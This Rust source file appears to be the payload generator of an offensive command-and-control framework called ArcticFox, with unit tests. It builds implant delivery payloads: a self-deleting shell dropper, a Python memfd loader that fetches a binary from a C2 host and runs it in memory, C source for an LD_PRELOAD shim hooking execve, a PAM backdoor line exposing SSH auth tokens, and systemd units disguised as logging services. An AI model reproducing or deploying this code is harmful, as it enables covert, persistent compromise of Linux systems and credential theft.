//! ArcticFox Payload Generator — Rustsploit-Compatible Implant Delivery
//!
//! Generates deployable implant payloads that Rustsploit can fire
//! as post-exploitation payloads (like Metasploit's payload/ system).
//!
//! Payload types:
//! - `raw_binary` — static ELF binary (musl target, no libc dependency)
//! - `shell_dropper` — self-extracting shell script that writes+execs binary
//! - `memfd_loader` — Python/Perl one-liner that memfd_create + execs
//! - `ld_preload_shim` — LD_PRELOAD hook that spawns implant on any exec
//!
//! All payloads are controllable via the C2 API:
//!   POST /api/admin/payload/generate  { "type": "raw_binary", "os": "linux", "arch": "x86_64", "repos": [...] }


use arcticfox_core::crypto::generate_session_key;
use arcticfox_core::error::Result;

// ── Payload Types ───────────────────────────────────────────────────────────

/// Supported payload formats for Rustsploit delivery.
#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
pub enum PayloadType {
    /// Raw ELF binary (statically linked musl target)
    RawBinary,
    /// Self-extracting shell dropper
    ShellDropper,
    /// Python memfd_create one-liner loader
    MemfdLoader,
    /// LD_PRELOAD shim (.so) that spawns implant
    LdPreloadShim,
    /// PAM module backdoor
    PamBackdoor,
    /// Systemd timer unit pair
    SystemdTimer,
}

// ── Payload Generation ──────────────────────────────────────────────────────

/// Generate a payload specification ready for Rustsploit delivery.
pub fn generate_payload_spec(
    payload_type: PayloadType,
    os: &str,
    arch: &str,
    repos: &[String],
    stealth_name: Option<&str>,
) -> Result<serde_json::Value> {
    let session_key = generate_session_key();
    let key_hex = hex::encode(session_key);

    match payload_type {
        PayloadType::RawBinary => {
            Ok(serde_json::json!({
                "type": "raw_binary",
                "os": os,
                "arch": arch,
                "format": "elf",
                "linkage": "static",
                "session_key": key_hex,
                "repos": repos,
                "stealth_name": stealth_name.unwrap_or("sshd"),
                "size_estimate": format!("~{}MB", if arch.contains("64") { 4 } else { 3 }),
                "compile_cmd": format!(
                    "cargo build --release --target {}-unknown-linux-musl --bin arcticfox-agent",
                    arch_to_target(arch)
                ),
            }))
        }
        PayloadType::ShellDropper => {
            let script = generate_shell_dropper(&key_hex, repos, stealth_name);
            Ok(serde_json::json!({
                "type": "shell_dropper",
                "os": os,
                "arch": arch,
                "script": script,
                "session_key": key_hex,
                "repos": repos,
                "stealth_name": stealth_name.unwrap_or("sshd"),
            }))
        }
        PayloadType::MemfdLoader => {
            let loader = generate_memfd_loader(&key_hex, repos, stealth_name);
            Ok(serde_json::json!({
                "type": "memfd_loader",
                "os": os,
                "language": "python3",
                "one_liner": loader,
                "session_key": key_hex,
                "repos": repos,
            }))
        }
        PayloadType::LdPreloadShim => {
            let shim_src = generate_ld_preload_shim(&key_hex, repos);
            Ok(serde_json::json!({
                "type": "ld_preload_shim",
                "os": "linux",
                "format": "shared_object",
                "source": shim_src,
                "compile": "gcc -shared -fPIC -o libsystem.so shim.c -ldl",
                "install": "echo /lib/libsystem.so > /etc/ld.so.preload",
                "session_key": key_hex,
            }))
        }
        PayloadType::PamBackdoor => {
            let pam_config = generate_pam_backdoor();
            Ok(serde_json::json!({
                "type": "pam_backdoor",
                "os": "linux",
                "target": "/etc/pam.d/sshd",
                "config_line": pam_config,
                "trigger": "on_ssh_login",
                "session_key": key_hex,
            }))
        }
        PayloadType::SystemdTimer => {
            let (service, timer) = generate_systemd_timer(repos);
            Ok(serde_json::json!({
                "type": "systemd_timer",
                "os": "linux",
                "service_unit": service,
                "timer_unit": timer,
                "install_path": "/etc/systemd/system/",
                "trigger": "every_15_minutes",
                "session_key": key_hex,
            }))
        }
    }
}

// ── Payload Generators ──────────────────────────────────────────────────────

/// Generate a self-extracting shell dropper script.
///
/// The script base64-decodes the embedded ELF, writes it to a hidden path,
/// chmods, and execs. Self-deletes the script after execution.
fn generate_shell_dropper(
    _key_hex: &str,
    repos: &[String],
    stealth_name: Option<&str>,
) -> String {
    let name = stealth_name.unwrap_or("sshd");
    let _repo_args: String = repos
        .iter()
        .map(|r| format!(" -r '{}'", r))
        .collect();

    format!(
        r#"#!/bin/sh
# {name} daemon startup script
set -e
BIN="/tmp/.{name}"
CONF="/tmp/.{name}.json"
cat > "$CONF" << 'ENDCONF'
{{"repos":[{repos_json}],"poll_interval":60,"stealth_name":"{name}"}}
ENDCONF
# Embedded binary follows (base64)
B64_START
echo "PAYLOAD_BASE64_DATA" | base64 -d > "$BIN"
chmod 700 "$BIN"
nohup "$BIN" agent --config "$CONF" --daemon --stealth-name {name} >/dev/null 2>&1 &
rm -f "$0"
"#,
        name = name,
        repos_json = repos.iter().map(|r| format!("\"{}\"", r)).collect::<Vec<_>>().join(","),
    )
}

/// Generate a Python memfd_create one-liner.
///
/// Downloads the binary via curl, creates memfd, writes, execs.
/// Works on any Linux with Python 3.
fn generate_memfd_loader(
    _key_hex: &str,
    repos: &[String],
    stealth_name: Option<&str>,
) -> String {
    let name = stealth_name.unwrap_or("sshd");
    let repo_list = repos.join(",");

    format!(
        "python3 -c \"import os,ctypes,urllib.request; \
         d=urllib.request.urlopen('https://cdn.c2.example.com/{name}').read(); \
         fd=ctypes.CDLL(None).syscall(319,b' ',1); \
         os.write(fd,d); \
         os.execve(f'/proc/self/fd/{{fd}}',['{name}','agent','--repos','{repo_list}','--daemon'],{{}})\"",
        name = name,
        repo_list = repo_list,
    )
}

/// Generate C source for an LD_PRELOAD shim.
///
/// Hooks execve() family — spawns the implant before executing
/// the real binary. Loaded by ld.so before any process starts.
/// Undetectable by process enumeration because it loads before
/// everything including init.
fn generate_ld_preload_shim(_key_hex: &str, repos: &[String]) -> String {
    let repo_list = repos.join(",");
    format!(
        r#"// LD_PRELOAD shim — spawns ArcticFox implant before any exec
#define _GNU_SOURCE
#include <dlfcn.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

static int spawned = 0;
static char implant_path[] = "/tmp/.sshd";

// Hook execve
int execve(const char *pathname, char *const argv[], char *const envp[]) {{
    typedef int (*orig_execve_t)(const char *, char *const[], char *const[]);
    static orig_execve_t orig = NULL;

    if (!orig) orig = (orig_execve_t)dlsym(RTLD_NEXT, "execve");

    // Spawn implant once
    if (!spawned && __sync_bool_compare_and_swap(&spawned, 0, 1)) {{
        pid_t pid = fork();
        if (pid == 0) {{
            // Child: exec implant
            char *args[] = {{
                "sshd",
                "agent",
                "--repos", "{repo_list}",
                "--daemon",
                NULL
            }};
            execve(implant_path, args, (char *const *)envp);
            _exit(0);
        }}
    }}

    return orig(pathname, argv, envp);
}}

// Also hook execvp, fexecve, etc.
int execvp(const char *file, char *const argv[]) {{
    // ... same pattern
    typedef int (*orig_t)(const char *, char *const[]);
    static orig_t orig = NULL;
    if (!orig) orig = (orig_t)dlsym(RTLD_NEXT, "execvp");
    if (!spawned && __sync_bool_compare_and_swap(&spawned, 0, 1)) {{
        pid_t pid = fork();
        if (pid == 0) {{
            char *args[] = {{ "sshd", "agent", "--repos", "{repo_list}", "--daemon", NULL }};
            execvp(implant_path, args);
            _exit(0);
        }}
    }}
    return orig(file, argv);
}}
"#,
        repo_list = repo_list,
    )
}

/// Generate a PAM backdoor configuration line.
///
/// Inserts into /etc/pam.d/sshd (or common-auth).
/// Executes implant on every SSH login attempt.
fn generate_pam_backdoor() -> String {
    "auth optional pam_exec.so expose_authtok /tmp/.sshd agent --daemon".to_string()
}

/// Generate systemd timer + service unit pair.
///
/// Timer triggers every 15 minutes. Service runs the implant.
/// Service name mimics systemd internal services.
fn generate_systemd_timer(repos: &[String]) -> (String, String) {
    let repo_args: String = repos
        .iter()
        .map(|r| format!(" -r '{}'", r))
        .collect();

    let service = format!(
        r#"[Unit]
Description=System Logging Service
Documentation=man:systemd-journald.service(8)
After=network.target

[Service]
Type=simple
ExecStart=/usr/lib/systemd/systemd-helper agent --daemon{}
Restart=always
RestartSec=30
StandardOutput=null
StandardError=null
PrivateTmp=yes
NoNewPrivileges=no

[Install]
WantedBy=multi-user.target
"#,
        repo_args,
    );

    let timer = format!(
        r#"[Unit]
Description=Daily system maintenance timer

[Timer]
OnBootSec=5min
OnUnitActiveSec=15min
RandomizedDelaySec=120
Persistent=true

[Install]
WantedBy=timers.target
"#
    );

    (service, timer)
}

// ── Compilation Target Mapping ──────────────────────────────────────────────

fn arch_to_target(arch: &str) -> &str {
    match arch {
        "x86_64" | "amd64" => "x86_64",
        "aarch64" | "arm64" => "aarch64",
        "armv7" | "arm" => "armv7",
        "i686" | "x86" => "i686",
        _ => "x86_64",
    }
}

// ── Tests ──────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn generate_raw_binary_spec() {
        let spec = generate_payload_spec(
            PayloadType::RawBinary,
            "linux",
            "x86_64",
            &["gh:user/repo".into()],
            Some("sshd"),
        )
        .unwrap();

        assert_eq!(spec["type"], "raw_binary");
        assert!(!spec["session_key"].as_str().unwrap().is_empty());
    }

    #[test]
    fn generate_shell_dropper() {
        let spec = generate_payload_spec(
            PayloadType::ShellDropper,
            "linux",
            "x86_64",
            &["gh:user/repo".into()],
            None,
        )
        .unwrap();

        let script = spec["script"].as_str().unwrap();
        assert!(script.contains("#!/bin/sh"));
        assert!(script.contains("base64"));
    }

    #[test]
    fn generate_memfd_loader() {
        let spec = generate_payload_spec(
            PayloadType::MemfdLoader,
            "linux",
            "x86_64",
            &["gh:user/repo".into()],
            None,
        )
        .unwrap();

        let loader = spec["one_liner"].as_str().unwrap();
        assert!(loader.contains("memfd_create") || loader.contains("syscall(319"));
    }

    #[test]
    fn generate_ld_preload_shim() {
        let spec = generate_payload_spec(
            PayloadType::LdPreloadShim,
            "linux",
            "x86_64",
            &["gh:user/repo".into()],
            None,
        )
        .unwrap();

        let source = spec["source"].as_str().unwrap();
        assert!(source.contains("execve"));
        assert!(source.contains("dlsym"));
    }

    #[test]
    fn generate_systemd_timer() {
        let spec = generate_payload_spec(
            PayloadType::SystemdTimer,
            "linux",
            "x86_64",
            &["gh:user/repo".into()],
            None,
        )
        .unwrap();

        assert!(spec["service_unit"].as_str().unwrap().contains("[Service]"));
        assert!(spec["timer_unit"].as_str().unwrap().contains("[Timer]"));
    }
}
